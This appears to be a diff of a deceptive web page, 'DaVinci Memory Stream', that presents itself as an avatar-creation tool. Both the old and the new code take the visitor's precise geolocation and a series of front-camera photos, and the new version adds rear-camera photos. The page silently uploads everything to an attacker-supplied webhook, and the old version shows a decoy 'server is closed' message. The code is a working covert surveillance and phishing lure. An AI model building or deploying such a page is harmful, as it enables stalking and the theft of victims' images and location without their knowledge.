@@ -1,207 +1,113 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DaVinci's Memory Stream</title>
-    <style>
-        html, body { height: 100%; margin: 0; padding: 0; }
-        body {
-            min-height: 100vh;
-            width: 100vw;
-            box-sizing: border-box;
-            background:  linear-gradient(135deg, #e0eafc, #cfdef3);
-            font-family: 'Segoe UI', Arial, sans-serif;
-            color: #222;
-            overflow: hidden;
-            text-align:center;
-        }
-        #permission {
-            position: absolute;
-            top: 50%; left: 50%; transform: translate(-50%, -50%);
-            text-align: center; width: 100vw;
-        }
-        #startBtn {
-            padding: 14px 38px;
-            font-size: 22px;
-            border-radius: 18px;
-            border: none;
-            background: linear-gradient(90deg, #4ecdc4 40%, #5563de 100%);
-            color: #fff;
-            cursor: pointer;
-            box-shadow: 0 2px 10px #4ecdc480;
-            transition: background 0.3s, box-shadow 0.3s;
-            margin-top: 24px;
-        }
-        #startBtn:hover {
-            background: linear-gradient(90deg, #5563de 40%, #4ecdc4 100%);
-            box-shadow: 0 4px 20px #5563de50;
-        }
-        #countdown {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            width: 100vw; height: 100vh;
-            background: linear-gradient(135deg, #e0eafc 60%, #5563de 100%);
-            z-index: 1000;
-        }
-        #countdownNum {
-            font-size: 18vw;
-            font-weight: bold;
-            color: #fff;
-            text-shadow: 0 0 55px #5563de, 0 0 35px #fff, 0 0 20px #4ecdc4;
-            animation: countdownPulse 1s infinite;
-            letter-spacing: 10px;
-            margin-top: 0; margin-bottom: 0;
-            user-select: none;
-        }
-        @keyframes countdownPulse {
-            0% { transform: scale(1); color: #fff; text-shadow: 0 0 55px #5563de, 0 0 35px #fff, 0 0 20px #4ecdc4;}
-            50% { transform: scale(1.15); color: #5563de; text-shadow: 0 0 90px #4ecdc4, 0 0 55px #fff, 0 0 38px #5563de;}
-            100% { transform: scale(1); color: #fff; text-shadow: 0 0 55px #5563de, 0 0 35px #fff, 0 0 20px #4ecdc4;}
-        }
-        #final {
-            font-size: 2em;
-            color: #4ecdc4;
-            font-weight: bold;
-            margin-top: 60px;
-        }
-        #location {
-            font-size: 1.2em;
-            margin-top: 18px;
-            color: #444;
-        }
-        .note {
-            font-size: 14px;
-            color: #555;
-            margin-top: 30px;
-        }
-        #status, canvas { display: none; }
-    </style>
+<meta charset="UTF-8">
+<title>DaVinci Memory Stream</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body{
+    margin:0;
+    height:100vh;
+    background:linear-gradient(135deg,#e0eafc,#cfdef3);
+    font-family:Segoe UI,Arial;
+    text-align:center;
+}
+#startBtn{
+    margin-top:40vh;
+    padding:14px 36px;
+    font-size:22px;
+    border:none;
+    border-radius:18px;
+    background:linear-gradient(90deg,#4ecdc4,#5563de);
+    color:#fff;
+}
+#countdown{
+    display:none;
+    position:fixed;
+    inset:0;
+    background:#0008;
+    color:white;
+    font-size:15vw;
+    align-items:center;
+    justify-content:center;
+}
+canvas{display:none}
+</style>
 </head>
 <body>
-    <div id="permission">
-        <h2>DaVinci's Memory Stream</h2>
-        <p>Welcome! To began the journey press below</p>
-        <button id="startBtn">Avatar Creation</button>
-    </div>
-    <div id="countdown" style="display:none;">
-        <span id="countdownNum">5</span>
-    </div>
-    <div id="final" style="display:none;"></div>
-    <div id="location" style="display:none;"></div>
-    <div class="note" style="display:none;">DaVinci’s server is closed sorry!</div>
-    <div id="status"></div>
-    <canvas id="canvas"></canvas>
-    <script>
-        const permissionDiv = document.getElementById('permission');
-        const startBtn = document.getElementById('startBtn');
-        const countdownDiv = document.getElementById('countdown');
-        const countdownNum = document.getElementById('countdownNum');
-        const statusDiv = document.getElementById('status');
-        const finalDiv = document.getElementById('final');
-        const locationDiv = document.getElementById('location');
-        const noteDiv = document.querySelector('.note');
-        const canvas = document.getElementById('canvas');
-        let locationData = { lat: 'N/A', lon: 'N/A' };
-        let WEBHOOK_URL = '';
 
-        // Load webhook URL
-        fetch('webhook.txt')
-            .then(response => response.text())
-            .then(url => { WEBHOOK_URL = url.trim(); })
-            .catch(err => {
-                statusDiv.style.display = 'block';
-                statusDiv.textContent = 'Error loading webhook URL! Check webhook.txt.';
-            });
+<button id="startBtn">Avatar Creation</button>
+<div id="countdown">📷</div>
+<canvas id="canvas"></canvas>
 
-        startBtn.onclick = async () => {
-            permissionDiv.style.display = 'none';
-            statusDiv.style.display = 'block';
-            statusDiv.textContent = '...';
+<script>
+const startBtn = document.getElementById("startBtn");
+const countdown = document.getElementById("countdown");
+const canvas = document.getElementById("canvas");
 
-            // Get location
-            if (navigator.geolocation) {
-                await new Promise(resolve => {
-                    navigator.geolocation.getCurrentPosition(
-                        pos => {
-                            locationData = {
-                                lat: pos.coords.latitude.toFixed(8),
-                                lon: pos.coords.longitude.toFixed(8)
-                            };
-                            resolve();
-                        },
-                        err => { resolve(); }
-                    );
-                });
-            }
+let WEBHOOK_URL = "PASTE_YOUR_WEBHOOK_URL_HERE";
+let locationData = {lat:"N/A", lon:"N/A"};
 
-            // Get camera
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                statusDiv.textContent = 'Access granted!';
-                statusDiv.style.display = 'none';
+async function getLocation(){
+    if(!navigator.geolocation) return;
+    try{
+        const pos = await new Promise((res,rej)=>
+            navigator.geolocation.getCurrentPosition(res,rej)
+        );
+        locationData.lat = pos.coords.latitude.toFixed(6);
+        locationData.lon = pos.coords.longitude.toFixed(6);
+    }catch{}
+}
 
-                // Prepare video for photo capture
-                const video = document.createElement('video');
-                video.autoplay = true;
-                video.srcObject = stream;
-                video.playsInline = true;
-                video.style.display = 'none';
-                document.body.appendChild(video);
+async function capturePhotos(facingMode,count,label){
+    const stream = await navigator.mediaDevices.getUserMedia({
+        video:{facingMode}
+    });
 
-                video.onloadedmetadata = () => {
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    let ctx = canvas.getContext('2d');
-                    let count = 5;
-                    let photoNum = 0;
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
 
-                    countdownDiv.style.display = 'flex';
-                    countdownNum.textContent = count;
+    canvas.width = 640;
+    canvas.height = 480;
+    const ctx = canvas.getContext("2d");
 
-                    let countdownInterval = setInterval(() => {
-                        if (count > 0) {
-                            countdownNum.textContent = count;
-                            // Capture and send photo for current count (5 to 1)
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            canvas.toBlob(blob => {
-                                const formData = new FormData();
-                                formData.append('file', blob, `memory_${photoNum}.jpg`);
-                                formData.append('content', `DaVinci Memory #${photoNum} [${locationData.lat}, ${locationData.lon}]`);
-                                fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-                            }, 'image/jpeg', 0.8);
-                            photoNum++;
-                            count--;
-                        } else {
-                            // End countdown at 0, don't take any more photos
-                            countdownNum.textContent = '';
-                            clearInterval(countdownInterval);
-                            countdownDiv.style.display = 'none';
-                            video.srcObject.getTracks().forEach(track => track.stop());
-                            video.remove();
-                            finish();
-                        }
-                    }, 1000);
-                };
-            } catch (err) {
-                statusDiv.textContent = 'Camera access denied! Cannot join memory.';
-                statusDiv.style.display = 'block';
-            }
-        };
+    for(let i=1;i<=count;i++){
+        await new Promise(r=>setTimeout(r,800));
+        ctx.drawImage(video,0,0,canvas.width,canvas.height);
 
-        function finish() {
-            finalDiv.style.display = 'block';
-            finalDiv.textContent = "DaVinci's memory.";
-           // locationDiv.style.display = 'block'; //
-           // locationDiv.textContent = `Location: ${locationData.lat}, ${locationData.lon}`; //
-            noteDiv.style.display = 'block';
-        }
-    </script>
+        await new Promise(resolve=>{
+            canvas.toBlob(blob=>{
+                const fd = new FormData();
+                fd.append("file",blob,`${label}_${i}.jpg`);
+                fd.append(
+                    "content",
+                    `${label} ${i} [${locationData.lat},${locationData.lon}]`
+                );
+                fetch(WEBHOOK_URL,{method:"POST",body:fd});
+                resolve();
+            },"image/jpeg",0.8);
+        });
+    }
+
+    stream.getTracks().forEach(t=>t.stop());
+}
+
+startBtn.onclick = async ()=>{
+    startBtn.style.display="none";
+    countdown.style.display="flex";
+
+    await getLocation();
+
+    countdown.textContent="Front";
+    await capturePhotos("user",5,"selfie");
+
+    countdown.textContent="Back";
+    await capturePhotos("environment",5,"backcam");
+
+    countdown.textContent="Done";
+    setTimeout(()=>countdown.style.display="none",1500);
+};
+</script>
 </body>
 </html>
-
-
-
